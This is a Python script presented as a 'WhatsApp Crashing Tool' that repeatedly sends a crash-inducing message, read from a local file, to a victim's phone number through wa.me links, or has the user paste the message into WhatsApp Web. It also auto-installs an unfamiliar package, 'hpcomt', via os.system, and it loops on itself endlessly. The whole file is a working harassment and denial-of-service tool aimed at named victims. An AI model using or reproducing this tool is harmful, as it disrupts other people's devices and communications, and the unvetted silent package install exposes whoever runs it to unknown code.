import os
import time
import webbrowser
try:
    import hpcomt
except ModuleNotFoundError:
    print('Module is not installed\n')
    os.system('pip install hpcomt')
print('\t\t\tWhatsApp Crashing Tool v1.2 By E4CRYTP3D')
user_os = hpcomt.Name()



def whatsapp_crashingmain():
    with open('crasher.txt', 'r') as mobile:
        text = mobile.read()
    if user_os == 'Windows':
        print('Please Copy this message and login to your Whatsapp account by scanning the QRCODE and send it to the Victim')
        print('NOTE: PLEASE CLOSE THE NOTEPAD AFTER COPYING THE TEXT.')
        os.system('notepad.exe pc_crasher.txt')
        time.sleep(3)
        webbrowser.open('https://web.whatsapp.com')
    elif user_os == 'Linux':
        print('Please Copy this message and login to your Whatsapp account by scanning the QRCODE and send it to the Victim')
        print('NOTE: PLEASE CLOSE THE VIM AFTER COPYING THE TEXT.')
        os.system('vim pc_crasher.txt')
        time.sleep(3)
        webbrowser.open('https://web.whatsapp.com')
    elif user_os == 'Android':
        get_target = input(
            "Enter the Victims Phone number with country Code=> ")
        print()
        crashing = int(
            input('[+] Enter the number of crashes (Max 25 per 240 Min) \n\n=> '))
        os_command = f'xdg-open https://wa.me/{get_target}/?text={text}'
        for i in range(crashing):
            print()
            print("[✓] Sending Crasher")
            os_bool = os.system(os_command)
            time.sleep(5)
            if os_bool == 0:
                print("Successful")
                pass
            else:
                print("[×] Crash Failed  ")
            time.sleep(0.4)
        return whatsapp_crashingmain()


whatsapp_crashingmain()
